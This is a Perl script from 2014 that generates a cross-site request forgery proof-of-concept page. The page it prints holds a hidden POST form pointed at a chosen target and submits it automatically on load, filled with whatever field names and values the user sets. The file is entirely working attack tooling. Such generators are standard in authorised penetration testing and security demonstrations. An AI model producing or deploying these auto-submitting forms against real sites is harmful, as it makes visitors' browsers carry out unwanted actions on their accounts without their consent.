#!/usr/bin/perl
# vim:ft=perl

# CSRF PoC generator
# (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

use strict;
use warnings;

my $target = 'http://';

my @input = (
    [ 'name1', 'value1' ],
    [ 'name2', 'value2' ],
    [ 'name3', 'value3' ]
);
my $len = scalar @input;

print "<html>\n";
print "<head>\n";
print "\t<script language=\"javascript\">\n";
print "\t\tfunction submitCSRF() {\n";
print "\t\t\tdocument.csrf.submit();\n";
print "\t\t}\n";
print "\t</script>\n";
print "</head>\n";
print "<body onload=\"submitCSRF()\">\n";
print "\t<form action=\"$target\" method=\"POST\" name=\"csrf\">\n";

for ( my $n = 0; $n < $len; $n++ ) {
    print
        "\t\t<input type=\"hidden\" name=\"$input[$n][0]\" value=\"$input[$n][1]\">\n";
}

print "\t</form>\n";
print "</body>\n";
print "</html>\n";
